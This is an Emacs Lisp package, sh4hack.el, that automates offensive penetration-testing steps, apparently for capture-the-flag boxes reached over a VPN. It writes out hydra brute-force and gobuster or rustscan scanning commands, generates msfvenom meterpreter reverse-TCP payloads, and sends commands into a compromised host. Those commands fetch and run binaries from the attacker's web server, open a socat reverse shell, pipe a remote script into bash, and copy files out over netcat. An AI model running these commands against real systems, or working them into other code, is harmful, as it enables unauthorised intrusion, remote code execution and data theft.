;; -*- lexical-binding: t -*-

;;; sh4hack.el --- Shell utilities for Emacs hackers

;; Author: tipotto <tipotto404@gmail.com>
;; Copyright (C) 2022 tipotto, all rights reserved.
;; Version: 1.0

(require 'multi-term)
(require 'hydra)
(require 'sh4hack-multi-term-extensions)
(require 'sh4hack-keybindings)

(fset 'sh (symbol-function 'shell-command-to-string))

(defgroup sh4hack nil
  "Group for sh4hack")

(defcustom sh4h-conf-dir "~/.emacs.d/sh4hack"
  "The default directory for sh4hack configuration."
  :type 'string
  :group 'sh4hack)

(defcustom sh4h-scripts-dir (format "%s/scripts" sh4h-conf-dir)
  "The default directory for pre-installed sh4hack scripts."
  :type 'string
  :group 'sh4hack)

(defcustom sh4h-rfiles-dir (format "%s/rfiles" sh4h-conf-dir)
  "The default directory for editing files on remote server."
  :type 'string
  :group 'sh4hack)

(defcustom sh4h-www-dir (format "%s/www" sh4h-conf-dir)
  "The default directory for files where remote server downloads."
  :type 'string
  :group 'sh4hack)

(setq sh4h-command-alist
  '(
    (gobuster-file . "gobuster dir -u http://$rhost -w $wordlist -t 100 -x php,txt -o gobuster/$output.out -k -r -q")
    (gobuster-dir . "gobuster dir -u http://$rhost -w $wordlist -t 100 -o gobuster/$output.out -k -r -q")
    (gobuster-vhost . "gobuster vhost -u http://$rhost -w $wordlist -t 100 -o gobuster/$output.out -k -r -q")
    (rustscan-all . "ports=$(rustscan -a $rhost -b 1000 -r 0-65535 -t 5000 -- --min-rate 10000 -oN rustscan/all.out | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//)")
    (rustscan-ports . "rustscan -a $rhost -b 1000 -p $ports -t 5000 -- --min-rate 10000 -sV --script=vuln -oN rustscan/ports.out")
    (hydra-normal . "hydra $wordlist $rhost http -t 100")
    (hydra-get . "hydra $wordlist $rhost http-get \"[REQUEST PATH]\"")
    (hydra-post . "hydra $wordlist $rhost http-post-form \"[REQUEST PATH]:[REQUEST BODY]:[ERROR MESSAGE]\"")
    ))

(setq sh4h-wordlist-path-alist
  '(
    (file . "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt")
    (dir . "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt")
    (vhost . "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")
    (user . "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")
    (password . "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt")
    ))

(setq sh4h-wordlist-syntax-alist
  '(
    (hydra-none . "-l $user -p $password")
    (hydra-user . "-L $user -p $password")
    (hydra-password . "-l $user -P $password")
    (hydra-user-password . "-L $user -P $password")
    ))

(defconst async-buffer-name "*Async Shell Command*")
(defconst buffer-not-found-error-message "Selected buffer not found.")
(defconst process-not-live-error-message "No live process running.")
(defconst socat-binary-url "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat")
(defconst nc-notification-listener "nc -lp 8889")
(defconst progress-bar-mark "■")
(defconst progress-bar-timeout-sec 120)

(defvar sh4h-user nil)
(defvar sh4h-rhost nil)
(defvar sh4h-lhost nil)
(defvar sh4h-port 22)
(defvar sh4h-term-num 1)
(defvar sh4h-luser nil)
(defvar sh4h-lhostname nil)
(defvar sh4h-term nil)
(defvar sh4h-stty-rows nil)
(defvar sh4h-stty-columns nil)

;(setq sh4h-luser "vagrant")

(defmacro inc (var)
  `(setq ,var (1+ ,var)))

(defmacro create-sentinel (&rest forms)
  `(lambda (process signal)
     (when (memq (process-status process) '(exit signal))
       ,@forms
       (shell-command-sentinel process signal))))

(defmacro run (term &rest forms)
  (interactive)
  `(lambda ()
     (if (not ,term)
	 (message ,buffer-not-found-error-message)
       ,@forms)))

(defmacro run-and-monitor (cmd sentinel &optional term &rest forms)
  (interactive)
  `(lambda ()
     (let ((proc (generate-async-proc ,cmd)))
       (if (not ,term)
	   (message ,buffer-not-found-error-message)
	 (if (not (process-live-p proc))
	     (message ,process-not-live-error-message)
           (set-process-sentinel proc ,sentinel)
	   ,@forms)))))

(defun set-term-info ()
  (interactive)
  (when (or (null sh4h-term) (null sh4h-stty-rows) (null sh4h-stty-columns))
    (sh-in-buffer (current-buffer) "clear && echo \"$(whoami):$(hostname):$(echo $TERM):$(stty -a | grep -F rows | awk '{if ( $4 == \"rows\" ){ print $5 }}'):$(stty -a | grep -F columns | awk '{if ( $6 == \"columns\" ){ print $7 }}')\" | tr -d ';'")
    (sleep-for 1)
    (term-line-mode)
    (let* ((beg (progn (previous-line) (beginning-of-line) (point)))
	   (end (progn (end-of-line) (point)))
	   (output (buffer-substring-no-properties beg end))
	   (list (split-string output "\:")))
      (setq sh4h-luser (car list))
      (setq sh4h-lhostname (car (nthcdr 1 list)))
      (setq sh4h-term (car (nthcdr 2 list)))
      (setq sh4h-stty-rows (car (nthcdr 3 list)))
      (setq sh4h-stty-columns (car (last list)))
      (term-char-mode)))
  ;(sh-in-buffer (current-buffer) "clear")
  )

(defun run-after-conn-established (buffer &optional if-msf)
  (interactive)
  (when (null if-msf)
    (sh-in-buffer buffer "cd ~")
    (sh-in-buffer buffer (format "export SHELL=bash; export TERM=%s" sh4h-term))
    (sh-in-buffer buffer (format "stty rows %s columns %s" sh4h-stty-rows sh4h-stty-columns)))
  (kill-all-async-buffers))

(defun show-progress (buffer &optional user)
  (interactive)
  (let ((counter 0)
	(progress-bar progress-bar-mark)
	(prompt-regexp (get-prompt-regexp user)))
    (while (and (not (connection-establish-p buffer prompt-regexp)) (< counter progress-bar-timeout-sec))
      (sleep-for 1)
      (message "Progress: %s" progress-bar)
      (setq progress-bar (concat progress-bar progress-bar-mark))
      (inc counter))
    (< counter progress-bar-timeout-sec)))

(defun ssh-with-public-key ()
  (interactive)
  (find-file "/ssh:hack:~/"))

(defun ssh-with-password (user rhost port)
  (interactive)
  (find-file (format "/ssh:%s@%s#%s:~/" user rhost port)))

(defun register-public-key (rhost)
  (interactive)
  (transfer-script rhost "~/.ssh/id_rsa.pub"))

(defun generate-ssh-conf (user rhost port)
  (interactive)
  (sh (format "%s/generate-ssh-config.sh %s %s %s" sh4h-scripts-dir user rhost port)))

(defun generate-ssh-key (user rhost)
  (interactive)
  (sh (format "ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa <<< y -N '' -C %s@%s -q" user rhost)))

(defun check-read-string (orig-fun &rest args)
  (interactive)
  (let ((res (apply orig-fun args)))
    (unless (zerop (length res)) res)))

(advice-add 'read-string :around #'check-read-string)

(defun read-user ()
  (interactive)
  (setq sh4h-user (read-string "User?: " sh4h-user nil nil)))

(defun read-rhost ()
  (interactive)
  (setq sh4h-rhost (read-string "Rhost?: " sh4h-rhost nil nil)))

(defun read-integer (prompt initial-input default-value)
  (interactive)
  (let ((default-val-str (number-to-string default-value))
	(_prompt (replace-in-string ":" (format " (default %s):" default-value) prompt)))
    (string-to-number (read-string _prompt (number-to-string initial-input) nil default-val-str))))

(defun read-port ()
  (interactive)
  (setq sh4h-port (read-integer "Port?: " sh4h-port 22)))

(defun read-term-num ()
  (interactive)
  (setq sh4h-term-num (read-integer "*terminal<?>*: " sh4h-term-num 1)))

(defun get-user ()
  (interactive)
  (if (null sh4h-user)
    (read-user))
  sh4h-user)

(defun get-rhost ()
  (interactive)
  (if (null sh4h-rhost)
    (read-rhost))
  sh4h-rhost)

(defun get-lhost ()
  (interactive)
  (let ((lhost (replace-in-string "\n" "" (sh "/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1"))))
    (if (not (string= lhost "Device \"tun0\" does not exist."))
	(progn (setq sh4h-lhost lhost)
	       (message "VPN setup is successfully completed."))
      (message "VPN setup is on the process.")
      (sleep-for 5)
      (get-lhost))))

(defun replace-in-string (what with in)
  (replace-regexp-in-string (regexp-quote what) with in nil 'literal))

(defun string-include-p (substr str)
  (interactive)
  (string-match-p (regexp-quote substr) str))

;(defun convert-string-to-symbol (str)
;  (interactive)
;  (car (read-from-string str)))

(defun get-snippet (key alist-var)
  (interactive)
  (cdr (assoc (if (stringp key) (intern key) key) alist-var)))

(defun extract-file-name-from-abs-path (path)
  (interactive)
  (car (last (split-string path "/"))))

(defun join-with-hyphen (&rest args)
  (interactive)
  (mapconcat (lambda (arg) (cond ((stringp arg) arg)
				 ((symbolp arg) (symbol-name arg))
				 ((integerp arg) (number-to-string arg)))) args "-"))

;(defun empty-string-p (string)
;  (or (null string)
;      (zerop (length (string-trim string)))))

(defun select-wordlist (wlist-path type)
  (interactive)
  (if (null wlist-path) wlist-path
    (let* ((file (extract-file-name-from-abs-path wlist-path))
	   (dir (replace-in-string file "" wlist-path))
	   (buf (find-file dir))
	   (path nil))
      (setq path (read-file-name (format "%s list?: " type) wlist-path nil t))
      (kill-buffer buf)
      (if (string-empty-p path) wlist-path path))))

(defun get-snippet-with-single-wlist (cmd subcmd cmd-snippet)
  (interactive)
  (let* ((default-path (get-snippet subcmd sh4h-wordlist-path-alist))
	 (selected-path (select-wordlist default-path subcmd))
	 (file (extract-file-name-from-abs-path selected-path))
	 (snippet (replace-in-string "$output" file cmd-snippet)))
    (replace-in-string "$wordlist" selected-path snippet)))

(defun get-snippet-with-multi-wlists (cmd subcmd cmd-snippet)
  (interactive)
  (let* ((wlist-path nil)
	 (wlist-type (completing-read
		      "Wordlist type? (user/password/user-password/none): "
		      '(("user" 1) ("password" 2) ("user-password" 3) ("none" 4))
		      nil t nil nil "password"))
	 (wlist-type-list (split-string wlist-type "-"))
	 (wlist-type-list-car nil)
	 (wlist-syntax (get-snippet (join-with-hyphen cmd wlist-type) sh4h-wordlist-syntax-alist))
	 (snippet (replace-in-string "$output" (join-with-hyphen cmd subcmd) cmd-snippet)))
    (while wlist-type-list
      (setq wlist-type-list-car (car wlist-type-list))
      (setq wlist-path (select-wordlist (get-snippet wlist-type-list-car sh4h-wordlist-path-alist) wlist-type-list-car))
      (setq wlist-syntax (replace-in-string (format "$%s" wlist-type-list-car) wlist-path wlist-syntax))
      (setq wlist-type-list (cdr wlist-type-list)))
    (replace-in-string "$wordlist" wlist-syntax snippet)))
  
(defun get-snippet-with-wordlist (cmd subcmd list-type cmd-snippet)
  (interactive)
  (if (string= 'multi list-type)
      (get-snippet-with-multi-wlists cmd subcmd cmd-snippet)
    (get-snippet-with-single-wlist cmd subcmd cmd-snippet)))

(defun get-command-snippet (cmd subcmd &optional list-type)
  (interactive)
  (let* ((cmd-name (join-with-hyphen cmd subcmd))
	 (cmd-snippet (get-snippet cmd-name sh4h-command-alist)))
    (when (string-include-p "$rhost" cmd-snippet)
      (setq cmd-snippet (replace-in-string "$rhost" (get-rhost) cmd-snippet)))
    (when (string-include-p "$lhost" cmd-snippet)
      (setq cmd-snippet (replace-in-string "$lhost" (get-lhost) cmd-snippet)))
    (when (string-include-p "$wordlist" cmd-snippet)
      (setq cmd-snippet (get-snippet-with-wordlist cmd subcmd list-type cmd-snippet)))
    cmd-snippet))

(defun run-from-snippet (cmd subcmd &optional list-type)
  (interactive)
  (let* ((cmd-snippet (get-command-snippet cmd subcmd list-type))
	 (prompt (format "Command (%s):\n" (join-with-hyphen cmd subcmd))))
    (sh-in-buffer (get-term-buffer) (read-string prompt cmd-snippet))))

(defun register-info ()
  (interactive)
  (read-user)
  (read-rhost)
  (read-port)
  (read-term-num)
  (get-info))

(defun get-info ()
  (interactive)
  (message (format "User: %s\nRhost: %s\nLhost: %s\nPort: %s\nTerm Num: %s" sh4h-user sh4h-rhost sh4h-lhost sh4h-port sh4h-term-num)))

;(defun get-info ()
;  (interactive)
;  (message (format "User: %s\nRhost: %s\nLhost: %s\nPort: %s\nTerm num: %s, type: %s, stty-rows: %s, stty-columns: %s" sh4h-user sh4h-rhost sh4h-lhost sh4h-port sh4h-term-num sh4h-term sh4h-stty-rows sh4h-stty-columns)))

(defun prepare-ssh-key ()
  (interactive)
  (let ((user (get-user))
	(rhost (get-rhost)))
    (generate-ssh-key user rhost)    
    (generate-ssh-conf user rhost sh4h-port)
    (register-public-key rhost)))

(defun auth-with-password ()
  (interactive)
  (ssh-with-password (get-user) (get-rhost) sh4h-port))

(defun auth-with-public-key ()
  (interactive)
  (let ((term (get-term-buffer)))
    (funcall (run term
		  (if (y-or-n-p "Generate ssh key pair?: ")
		      (progn (start-remote-listener term)
			     (prepare-ssh-key)
			     (ssh-with-public-key))
		    (ssh-with-public-key))))))
  
(defun sh-in-buffer (buffer command-string)
  (interactive)
  (comint-send-string
   (get-buffer-process buffer)
   (concat command-string "\n")))

;(defun sh-in-buffer (command-string &optional buffer)
;  (interactive)
;  (comint-send-string
;   (get-buffer-process (if (null buffer) (current-buffer) buffer))
;   (concat command-string "\n")))

(defun get-buffer-list (buf-name-prefix)
  (interactive)
  (seq-filter (lambda (buf-name) (string-prefix-p buf-name-prefix buf-name)) (mapcar 'buffer-name (buffer-list))))

(defun concat-string-list (list)
  (interactive)
  (mapconcat 'identity list "\n"))

(defun get-term-buffer-by-num (term-num)
  (interactive)
  (get-buffer (format "*terminal<%s>*" term-num)))

(defun get-term-buffer ()
  (interactive)
  (if sh4h-term-num
      (get-term-buffer-by-num sh4h-term-num)
    (let ((buf (generate-new-buffer "*terminals*")))
      (switch-to-buffer buf)
      (insert "****** terminals ******\n\n")
      (insert (concat-string-list (get-buffer-list "*terminal<")))
      (let ((term (get-term-buffer-by-num (read-term-num))))
        (kill-buffer buf)
        term))))

(defun get-multi-term-buffer ()
  (interactive)
  (get-buffer (buffer-name (multi-term))))

(defun start-remote-listener (buffer)
  (interactive)
  (when buffer
    (sh-in-buffer buffer "nc -lp 7777 >> \"${HOME}/.ssh/authorized_keys\"")))

(defun get-process-num (cmd-str)
  (interactive)
  (string-to-number (sh (format "ps auxww | grep \"%s\" | grep -v grep | wc -l" cmd-str))))

(defun process-exists-p (cmd-str)
  (interactive)
  (not (zerop (get-process-num cmd-str))))

(defun async-process-exists-p ()
  (interactive)
  (not (zerop (length (get-buffer-list async-buffer-name)))))

(defun get-pid (process-name)
  (interactive)
  (sh (format "pgrep -f \"%s\"" process-name)))

(defun start-web-server ()
  (interactive)
  (let ((command (format "python3 -m http.server 80 -d %s" sh4h-www-dir)))
    (unless (process-exists-p command)
      (async-shell-command command))))

(defun kill-all-async-buffers ()
  (interactive)
  (kill-matching-buffers (format "^%s" async-buffer-name) nil t))

(defun kill-async-buffers ()
  (interactive)
  (create-sentinel
   (kill-all-async-buffers)))

(defun generate-async-proc (command)
  (interactive)
  (let* ((buffer-name (generate-new-buffer-name async-buffer-name))
	 (output-buffer (generate-new-buffer buffer-name)))
    (async-shell-command command output-buffer)
    (get-buffer-process output-buffer)))

(defun transfer-script (rhost file-path)
  (interactive)
  (sh (format "nc -w 3 %s 7777 < %s" rhost file-path)))

;(defun process-listen-p (port)
;  (interactive)
;  (string= 'LISTEN (sh (format "netstat -lt | grep -iF %s | awk '{print $6}'" port))))

;(defun process-establish-p (port)
;  (interactive)
;  (not (string-empty-p (sh (format "netstat -at | grep -iE \"%s:%s.*%s.*ESTABLISHED\"" sh4h-lhost port sh4h-rhost)))))

(defun connection-establish-p (buffer prompt-regexp)
  (interactive)
  (with-current-buffer buffer
    (not (null (search-backward-regexp prompt-regexp nil t nil)))))

(defun port-in-use-p (port)
  (interactive)
  (not (zerop (length (sh (format "lsof -i:%s" port))))))

(defun get-free-port (start end)
  (let ((port start))
    (while (and (port-in-use-p port) (< port end))
      (message "Port %s is in use..." port)
      (inc port))
    (when (< port end) port)))

(defun get-prompt-regexp (&optional user)
  (interactive)
  (if (null user) "meterpreter >" (format "%s@.+:.+\$" user)))

(defun async-fetch-socat ()
  (interactive)
  (let* ((cmd (format "ls %s/socat || wget %s -O %s/socat && chmod +x %s/socat" sh4h-www-dir socat-binary-url sh4h-www-dir sh4h-www-dir))
	 (proc (async-start
		`(lambda () (shell-command ,cmd))
		'ignore)))
    (async-wait proc)))

(defun connect-with-socat ()
  (interactive)
  (let* ((mterm (moniter-buffer-in-multi-thread))
	 (term (get-term-buffer))
	 (port (get-free-port 8500 8600))
	 (lcmd (format ". %s/banner.sh && %s/socat file:`tty`,raw,echo=0 TCP-L:%s" sh4h-scripts-dir sh4h-www-dir port))
	 (rcmd (format "cd /tmp && { ls socat >/dev/null 2>&1 || { wget http://%s/socat && chmod +x socat; } } && { ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost port)))
    (funcall (run term
		  (start-web-server)
		  (async-fetch-socat)
		  (sh-in-buffer mterm lcmd)
		  (sh-in-buffer term rcmd)))))

(defun inspect-server ()
  (interactive)
  (let ((term (get-term-buffer))
	(rcmd (format "curl -s http://%s/inspect.sh | bash && { nc -z -w 3 %s 8889 & }" sh4h-lhost sh4h-lhost)))
    (funcall (run-and-monitor nc-notification-listener
			      (kill-async-buffers)
			      term
			      (start-web-server)
			      (sh-in-buffer term rcmd)))))

(defun upgrade-netcat ()
  (interactive)
  (let ((term (get-term-buffer))
	(kill-buffer-query-functions nil))
    (funcall (run term
		  (switch-to-buffer term)
		  (sh-in-buffer term "python3 -c \"import pty;pty.spawn('/bin/bash')\"")
                  (sleep-for 0.5)
		  (term-send-raw-string "\C-z")
                  (sleep-for 0.5)
                  (sh-in-buffer term "stty raw -echo; fg")
                  (sleep-for 0.5)
		  (term-send-raw-string "\C-c")
		  ;(sh-in-buffer term "export SHELL=bash; export TERM=%s" sh4h-term)
		  ;(sleep-for 0.5)
		  ;(sh-in-buffer term "stty rows %s columns %s" sh4h-stty-rows sh4h-stty-columns)
		  ))))

(defun mold-lhost-ip ()
  (interactive)
  (replace-in-string "." "" sh4h-lhost))

(defun async-generate-payload (payload exp-name lport ext)
  (interactive)
  (let* ((exp-path (format "%s/%s" sh4h-www-dir exp-name))
	 (cmd (format "ls %s >/dev/null 2>&1 || msfvenom -p %s LHOST=%s LPORT=%s -o %s -f %s" exp-path payload sh4h-lhost lport exp-path ext))
	 (proc (async-start
		`(lambda () (shell-command ,cmd))
		'ignore)))
    (async-wait proc)))

(defun get-windows-payload (arch type)
  (interactive)
  (cond ((and (string= arch "x64") (string= type "staged")) "windows/x64/meterpreter/reverse_tcp")
	((and (string= arch "x64") (string= type "stageless")) "windows/x64/meterpreter_reverse_tcp")
	((and (string= arch "x86") (string= type "staged")) "windows/meterpreter/reverse_tcp")
	((and (string= arch "x86") (string= type "stageless")) "windows/meterpreter_reverse_tcp")))

(defun get-linux-payload (arch type)
  (interactive)
  (cond ((and (string= arch "x64") (string= type "staged")) "linux/x64/meterpreter/reverse_tcp")
	((and (string= arch "x64") (string= type "stageless")) "linux/x64/meterpreter_reverse_tcp")
	((and (string= arch "x86") (string= type "staged")) "linux/x86/meterpreter/reverse_tcp")
	((and (string= arch "x86") (string= type "stageless")) "linux/x86/meterpreter_reverse_tcp")))

(defun get-linux-exploit-base-name (arch type)
  (interactive)
  (cond ((and (string= arch "x64") (string= type "staged")) "linux-x64-staged")
	((and (string= arch "x64") (string= type "stageless")) "linux-x64-stageless")
	((and (string= arch "x86") (string= type "staged")) "linux-x86-staged")
	((and (string= arch "x86") (string= type "stageless")) "linux-x86-stageless")))

(defun get-linux-exploit-name (arch type lport)
  (interactive)
  (let ((lhost-str (mold-lhost-ip))
	(base-name (get-linux-exploit-base-name arch type)))
    (join-with-hyphen base-name lhost-str lport)))

(defun msf-windows (arch type)
  (interactive)
  (get-windows-payload arch type))

(defun moniter-buffer-in-multi-thread (&optional if-msf)
  (interactive)
  (let ((user (when (null if-msf) (get-user)))
	(mterm (get-multi-term-buffer)))
    (make-thread (lambda ()
		   (when (show-progress mterm user)
		     ;(run-after-conn-established mterm if-msf)
		     (message "Successfully Completed!"))))
    mterm))

(defun msf-linux (arch type)
  (interactive)  
  (let* ((mterm (moniter-buffer-in-multi-thread t))
	 (term (get-term-buffer))
	 (lport 5555)
	 (payload (get-linux-payload arch type))
	 (exp-name (get-linux-exploit-name arch type lport))
	 (lcmd1 (format ". %s/generate-msf-rc.sh %s %s" sh4h-scripts-dir payload sh4h-lhost))
	 (lcmd2 (format ". %s/banner.sh && msfconsole -r %s/msf.rc -q" sh4h-scripts-dir sh4h-scripts-dir))
	 (rcmd (format "cd /tmp && { ls %s >/dev/null 2>&1 || { wget http://%s/%s && chmod +x %s; } } && { ./%s & } && cd ~" exp-name sh4h-lhost exp-name exp-name exp-name)))
    (funcall (run term
		  (start-web-server)
		  (async-generate-payload payload exp-name lport 'elf)
	          (sh lcmd1)
                  (sh-in-buffer mterm lcmd2)
                  (sh-in-buffer term rcmd)))))

(defun after-save-remote-file (file fpath lpath term)
  (interactive)
  (let ((rcmd (format "nc -lp 10000 > %s && echo '[*] The file `%s` was written successfully!' && nc -z -w 3 %s 8889" fpath file sh4h-lhost))
	(lcmd (format "nc -w 3 %s 10000 < %s" (get-rhost) lpath)))
    (funcall (run-and-monitor nc-notification-listener
			      (kill-async-buffers)
			      'term
			      (remove-hook 'after-save-hook (apply-partially #'after-save-remote-file file fpath lpath term))
			      (kill-buffer)
			      (sh-in-buffer term rcmd)
			      (async-shell-command lcmd)))))

(defun after-remote-file-transfer (file fpath lpath term)
  (interactive)
  (create-sentinel
   (let ((status (string-to-number (remove-next-line (sh (format "[ -s %s ]; echo $?" lpath))))))
     (if (or (eq 0 status) (and (eq 1 status) (y-or-n-p (format "%s not exist. Create?:" file))))
	 (progn (add-hook 'after-save-hook (apply-partially #'after-save-remote-file file fpath lpath term))
		(find-file lpath))
       (kill-all-async-buffers)
       (sh (format "rm %s" lpath))))))

(defun replace-home-dir-in-filepath (path)
  (interactive)
  (replace-in-string (format "/home/%s" sh4h-luser) (format "/home/%s" (get-user)) path))

;(defun replace-home-dir-in-filepath (path)
;  (interactive)
;  (replace-regexp-in-string "/home/.+/" (format "/home/%s/" (get-user)) path nil 'literal))

(defun edit-remote-file ()
  (interactive)
  (let* ((term (get-term-buffer))
	 (sep (format "%s@.+:" (get-user)))
	 (rpath (progn (switch-to-buffer term)
		       (sleep-for 0.5)
		       (concat (term-extract-current-path sep) "/")))
   	 (fpath (replace-home-dir-in-filepath (expand-file-name (read-file-name "File?: " rpath) rpath)))
	 (file (extract-file-name-from-abs-path fpath))
   	 (lpath (format "%s/%s" sh4h-rfiles-dir file))
	 (rcmd (format "{ nc -w 3 %s 9999 < %s || nc -z -w 3 %s 9999; } >/dev/null 2>&1" sh4h-lhost fpath sh4h-lhost)))
    (funcall (run-and-monitor (format "nc -lp 9999 > %s" lpath)
			      (after-remote-file-transfer file fpath lpath term)
			      term
			      (sh-in-buffer term rcmd)))))

(defun fetch-remote-file ()
  (interactive)
  (let* ((term (get-term-buffer))
	 (sep (format "%s@.+:" (get-user)))
	 (rpath (progn (switch-to-buffer term)
		       (sleep-for 0.5)
		       (concat (term-extract-current-path sep) "/")))
   	 (fpath (replace-home-dir-in-filepath (expand-file-name (read-file-name "Which file?: " rpath) rpath)))
	 (file (extract-file-name-from-abs-path fpath))
	 (lpath (expand-file-name (read-file-name "Where to save?: " (format "%s%s" default-directory file))))
	 (rcmd (format "{ { nc -w 3 %s 9999 < %s && echo -e 'Success'; } || nc -z -w 3 %s 9999; } && nc -z -w 3 %s 8889" sh4h-lhost fpath sh4h-lhost sh4h-lhost)))
    (funcall (run-and-monitor nc-notification-listener
			      (kill-async-buffers)
			      term
			      (async-shell-command (format "nc -lp 9999 > %s && { [ -s %s ] || rm %s; }" lpath lpath lpath))
			      (sh-in-buffer term rcmd)))))

(defun run-remotely (term file)
  (interactive)
  (let ((rcmd (format "cd /tmp && wget %s/%s && nc -z -w 3 %s 8889 && chmod +x %s && ./%s" sh4h-lhost file sh4h-lhost file file)))
    (funcall (run-and-monitor nc-notification-listener
			      (kill-async-buffers)
			      term
			      (start-web-server)
			      (sh-in-buffer term rcmd)))))

(defun run-remotely-and-output-locally (term file)
  (interactive)
  (let ((lcmd (format "nc -lvnp 9002 | tee %s/%s.out" sh4h-rfiles-dir file))
	(rcmd (format "cd /tmp && wget %s/%s && nc -z -w 3 %s 8889 && chmod +x %s && ./%s | nc -w 3 %s 9002" sh4h-lhost file sh4h-lhost file file sh4h-lhost)))
    (funcall (run-and-monitor nc-notification-listener
			      (kill-async-buffers)
			      term
			      (start-web-server)
			      (sh-in-buffer (get-multi-term-buffer) lcmd)
			      (sh-in-buffer term rcmd)))))

(defun run-script-remotely ()
  (interactive)
  (let* ((term (get-term-buffer))
	 (default-dir-path (format "%s/" sh4h-www-dir))
	 (buf (find-file default-dir-path))
   	 (path (expand-file-name (read-file-name "File?: " default-dir-path "inspect.sh" nil) default-dir-path))
	 (file (extract-file-name-from-abs-path path))
	 (status (string-to-number (remove-next-line (sh (format "{ { ls %s/%s || cp %s %s; } >/dev/null 2>&1 }; echo $?" sh4h-www-dir file path sh4h-www-dir))))))
    (kill-buffer buf)
    (switch-to-buffer term)
    (if (eq 0 status)
	(if (y-or-n-p "Output into local file?: ")
	    (run-remotely-and-output-locally term file)
	  (run-remotely term file))
      (message "The script does not exist."))))

(get-lhost)
(provide 'sh4hack)
